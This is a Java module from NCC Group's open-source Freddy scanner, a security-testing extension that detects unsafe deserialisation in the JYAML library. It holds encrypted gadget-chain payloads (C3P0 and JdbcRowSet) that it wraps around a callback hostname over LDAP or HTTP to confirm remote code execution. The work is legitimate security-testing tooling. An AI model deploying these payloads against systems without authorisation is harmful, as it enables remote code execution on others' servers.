// Freddy the Serial(isation) Killer
// 
// Released as open source by NCC Group Plc - https://www.nccgroup.trust/
//
// Project link: https://github.com/nccgroup/freddy/
//
// Released under agpl-3.0 see LICENSE for more information

package nb.freddy.modules.java;

import nb.freddy.modules.FreddyModuleBase;
import nb.freddy.modules.IndicatorTarget;
import nb.freddy.modules.SeverityRating;
import nb.freddy.modules.TargetPlatform;

/***********************************************************
 * Module targeting the Java JYAML library.
 *
 * Written by Nicky Bloor (@NickstaDB).
 **********************************************************/
public class JYAMLModule extends FreddyModuleBase {
    //C3P0RefDataSource payload data
    private final String C3P0REF_PREFIX = decrypt("kcPKSbZWwsH79rR3Wz4aXhaDDYhr9Azi83CLm0Aad/UkiGPeKeOfPW9kUv9yWDU0RFytpPNvNxiZPmV5aaf0AKQzH6p/2SEtIB7hKXECDko=");
    private final String C3P0REF_SUFFIX = decrypt("PVAS6TS/5TBfpVpGGjJTkAZqhiCWjRIAbePppjSLDAw=");

    //C3P0WrapperConnPool payload data
    private final String C3P0WRAP_PREFIX = decrypt("kcPKSbZWwsH79rR3Wz4aXpTa44LcyI0gnCLvIzCoIydYBCeN+eJMD+ZB5Xu4QfQw3R9rjho0agfL9NLT2O5kP3nsRElJeSdHY+ZQqDEH1rYfbDjPLAMp4RkRK01GC0EXjNI4gO6TGkrvpeAA2zMQpezGwgxSMrHyV0c82ijSnwG7VrjxM9eFEemvq0yPldGsjSukDIlm6OwRYhrtD8pyjNAljs50Eon+g4ADmWkd87kMuUz8tDmopTbhV2M6Lr9uB+cfSFtsFQOh0OPPOxztboP7qUOZaYfEg9Xju7HFr1WFLTfC3qStKf01/OvqKf/B8Pog2cWxwdR9C3oRj91oQbhTsYU72G70e1nM7sGPxddj5shKPGHyNKxLHVzVaBqqxxC676VKoMUEFYloz+wVftvBNkITr0PSv38+yWdATrlQ+WPwU9Ew7b02lNB6LY6P9Ypq5e2pby1kBCb8x/JARGbVcrSn5twjRGioZg7JPHKipKrst4OM8Gz9s/a+l1M0ajUwlitosJAeihBRfkQD76SbnL+41jQL6zpJuhRPT8EfQuaJ2DbFWPGZcSga02lf0HhuWf/XS1oo5snGECYTsNuWdT98tbOhCOFa1XZhzBwBz8TtEvuTmVU5IdDyzcCz7x/kJRz77kuxhudsC4M/a/+JsSY7OcRnsR1FmngAPOo46c7VZmIDe3k9qV8l/nLqoKto5KFagxGqwXEYOiL6Ke8f5CUc++5LsYbnbAuDP2sOw5v+N1DA5pYnaBjziX8zlo/FfWxxKwCAfGW2Pv4Ngzaq4vpyzAsLE+HmaAcCCQtnjyLlJRzlyNh7OL3pX+/vnossxFQ8WaxUdKlMAfKs2jIY+E0/ypkJaPS/eDMsWf0PBSOksDItAJgG51xtu5GiCrZjXp1KKrEVVZhPbuLu2HgGPXv96aKI4ziVFnhbSKrdef+jbUXFXMyOVyYftJdAjc4Y5u1zZ3nAJWvOuyWElg41CFO22lc5DMe/RfXmVb+idPWLhqJIxSv9R4A4eNEFnzi4j2B7WMFf1F1dq1mtA3xpEP+sWKKxxWGe1qOBsk+Q2q+d++G5iTPr3cq3F3/hd2wf8Wj7kOiy24aTLAarqOw7P53NucPwvJdx3ZlXOZqjiNFBoQEkdLdBM4QuuDdBaRVcCL8XktCgiINM+bx7VFjgU0wiKK1SLgRKCDDqDdasvcLgqd7LhDI9XnN55ZXHcCdFJjqQvXxXj8I1EC53KZKYETZQOy2K8A7s2N7l+YCeVpfuULvSQYh1KC5RHqxJQgnilxV4BZzBs9fyHmFhPJAJNleyMa9xU2dFRV3lRt7gFXIloeh9NyjJa3apIUCWmn6cz0SdfyiBA+2eqC+Fb5gxXU1kqpyLNplnzCYcDdK3QReN4XwmOIzXK+RSdO+2mekMPAOeGgshL9RpfcKwzKB1E8jv/8tNdKZVkmGUZkrEuHifs+7h7TnE61T2DPhwCcFIpgnoBN0e4XR6t2bcvH/vBXkni4IxXkD5lkoIedb10NIF2FIy5KtWmlF9IYlGPq3vJMYhEDtojRH9Ag+oHg==");
    private final String C3P0WRAP_SUFFIX = decrypt("P8YgIAZmVozbODVQE/E2/Q==");

    //JdbcRowSet payload data
    private final String JDBC_PREFIX = decrypt("+D2cjyfNKsghU1B+62RVtWdcSF5sRMyolrKwuAUukydH8p1aFTp1NpbwK32fpT9BQ1fc8Ocs9RqipqpC16lGCg==");
    private final String JDBC_SUFFIX = decrypt("PSBgh3i/81Trr82RmEftudpN7s7z6DOokyI2iPa91uU=");

    protected void initialiseModule() {
        setName("JYAML");
        setPlatform(TargetPlatform.JAVA);
        setModuleIsRCECapable(true);
        setDescriptionCaveats("");
        setRemediationDetail("");
        setSeverity(SeverityRating.HIGH);

        //Register passive/active scan payloads
        registerPassiveScanIndicator("org.ho.yaml.exception.YamlException", IndicatorTarget.RESPONSE);

        registerActiveScanExceptionPayload("'", "org.ho.yaml.exception.YamlException");

        registerActiveScanCollaboratorPayload(PN_C3P0RDS, false);
        registerActiveScanCollaboratorPayload(PN_C3P0WCP, false);
        registerActiveScanCollaboratorPayload(PN_JDBC, false);
    }

    protected String generateCollaboratorTextPayload(String payloadName, String hostname) {
        switch (payloadName) {
            case PN_C3P0RDS:
                return C3P0REF_PREFIX + "ldap://" + hostname + "/" + C3P0REF_SUFFIX;

            case PN_C3P0WCP:
                return C3P0WRAP_PREFIX + encodeStringToAsciiHex(padString("http://" + hostname + "/", 200)) + C3P0WRAP_SUFFIX;

            case PN_JDBC:
                return JDBC_PREFIX + "ldap://" + hostname + "/" + JDBC_SUFFIX;
        }
        return null;
    }
}
